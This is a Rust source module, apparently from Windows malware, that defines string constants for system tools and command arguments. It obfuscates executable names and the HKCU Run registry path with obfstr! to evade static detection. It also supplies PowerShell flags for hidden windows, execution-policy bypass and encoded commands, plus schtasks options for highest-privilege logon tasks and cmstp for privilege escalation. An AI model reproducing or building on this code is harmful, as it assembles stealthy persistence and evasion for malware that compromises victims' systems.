pub mod exe {
    pub fn cmd() -> String { obfstr::obfstr!("cmd.exe").to_string() }
    pub fn powershell() -> String { obfstr::obfstr!("powershell.exe").to_string() }
    pub fn schtasks() -> String { obfstr::obfstr!("schtasks.exe").to_string() }
    pub fn cmstp() -> String { obfstr::obfstr!("cmstp.exe").to_string() }
    pub fn reg() -> String { obfstr::obfstr!("reg.exe").to_string() }
    pub fn taskkill() -> String { obfstr::obfstr!("taskkill.exe").to_string() }
    pub fn netsh() -> String { obfstr::obfstr!("netsh.exe").to_string() }
}

// PowerShell args
pub mod powershell {
    pub fn file() -> &'static str { "-File" }
    pub fn no_profile() -> &'static str { "-NoProfile" }
    pub fn window_style() -> &'static str { "-WindowStyle" }
    pub fn hidden() -> &'static str { "Hidden" }
    pub fn execution_policy() -> &'static str { "-ExecutionPolicy" }
    pub fn bypass() -> &'static str { "Bypass" }
    pub fn command() -> &'static str { "-Command" }
    pub fn non_interactive() -> &'static str { "-NonInteractive" }
    pub fn encoded_command() -> &'static str { "-EncodedCommand" }
}

// Command args
pub mod args {
    pub fn force() -> &'static str { "/f" }
    pub fn query() -> &'static str { "/query" }
    pub fn task_name() -> &'static str { "/tn" }
    pub fn create() -> &'static str { "/create" }
    pub fn task_run() -> &'static str { "/tr" }
    pub fn schedule() -> &'static str { "/sc" }
    pub fn onlogon() -> &'static str { "onlogon" }
    pub fn run_level() -> &'static str { "/rl" }
    pub fn highest() -> &'static str { "highest" }
    pub fn delete() -> &'static str { "/delete" }
    pub fn format_output() -> &'static str { "/fo" }
    pub fn list() -> &'static str { "LIST" }
}

// Registry paths
pub mod registry {
    pub fn hkcu() -> String { obfstr::obfstr!("HKEY_CURRENT_USER").to_string() }
    pub fn run_key() -> String { obfstr::obfstr!(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").to_string() }
}
